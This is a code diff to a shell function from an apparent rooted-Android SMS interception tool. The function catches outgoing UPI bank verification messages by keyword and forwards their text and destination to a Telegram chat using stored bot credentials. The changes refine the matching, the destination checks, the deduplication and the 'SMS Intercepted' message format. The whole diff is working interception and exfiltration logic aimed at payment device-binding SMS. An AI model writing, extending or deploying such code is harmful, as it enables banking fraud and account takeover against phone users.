@@ -733,17 +733,27 @@ forward_blocked_telegram() {
       return 0
       ;;
   esac
-  echo "$BLOCKED_BODY" | grep -qiE 'HEROAXISUPI|HEROAXIS|DO NOT COPY FORWARD|UNDER ANY CIRCUMSTANCE|YESPROUPI' \
+  # Normalize punctuation so "DO NOT COPY, FORWARD" matches (SMS Tweaks body)
+  BODY_NORM=$(printf '%s' "$BLOCKED_BODY" | tr '[:lower:]' '[:upper:]' | tr -d '[:punct:]')
+  echo "$BODY_NORM" | grep -qE 'HEROAXISUPI|HEROAXIS|DO NOT COPY FORWARD|UNDER ANY CIRCUMSTANCE|USE UPI PIN ONLY|YESPROUPI' \
     || {
       echo "tg_skip_not_outgoing $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
       return 0
     }
-  # To must be digits (verify shortcode / number)
+  # To must be digits (verify shortcode / number) — never package / OTP text
   TO_DIGITS=$(printf '%s' "$BLOCKED_DEST" | tr -cd '0-9')
   [ ${#TO_DIGITS} -ge 4 ] && [ ${#TO_DIGITS} -le 15 ] || {
     echo "tg_skip_bad_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     return 0
   }
+  # All-zero placeholder dest — never TG
+  case "$TO_DIGITS" in
+    *[!0]*) ;;
+    *)
+      echo "tg_skip_placeholder_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      return 0
+      ;;
+  esac
   BLOCKED_DEST="$TO_DIGITS"
 
   # Dedupe — same To+body only once
@@ -762,7 +772,8 @@ forward_blocked_telegram() {
   if [ -f /data/local/tmp/hivirtus_tg_inproc_sent.flag ]; then
     IN_DEST=$(head -n1 /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null | tr -d '\r')
     IN_BODY=$(tail -n +2 /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null | tr -d '\r')
-    if [ "$IN_DEST" = "$BLOCKED_DEST" ] && [ "$IN_BODY" = "$BLOCKED_BODY" ]; then
+    IN_DIGITS=$(printf '%s' "$IN_DEST" | tr -cd '0-9')
+    if [ "$IN_DIGITS" = "$BLOCKED_DEST" ] && [ "$IN_BODY" = "$BLOCKED_BODY" ]; then
       rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
             /data/local/tmp/hivirtus_outgoing_blocked.json \
             /data/local/tmp/hivirtus_pending_verify.json \
@@ -775,22 +786,21 @@ forward_blocked_telegram() {
   read_tg_creds
   [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
 
+  # Display like SMS Tweaks (+91 for 10-digit Indian)
   TO_NUM="$BLOCKED_DEST"
+  if [ ${#TO_DIGITS} -eq 10 ]; then
+    TO_NUM="+91${TO_DIGITS}"
+  fi
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
   ONE_TAP="To: ${TO_NUM}
 Message: ${MSG_BODY}"
 
-  # Exact Virtus format — NO pkg name in message
-  TEXT="📱 SMS Intercepted Zygisk Mode
-Menu By @Hivirtus 🔥
+  # Exact SMS Tweaks layout — outgoing only, no pkg / no menu spam
+  TEXT="📱 SMS Intercepted
 -----------------
-📞 To:
-${TO_NUM}
-
-💬 Message:
-${MSG_BODY}
-
+📞 To: ${TO_NUM}
+💬 Message: ${MSG_BODY}
 📋 One-tap copy:
 ${ONE_TAP}"
 
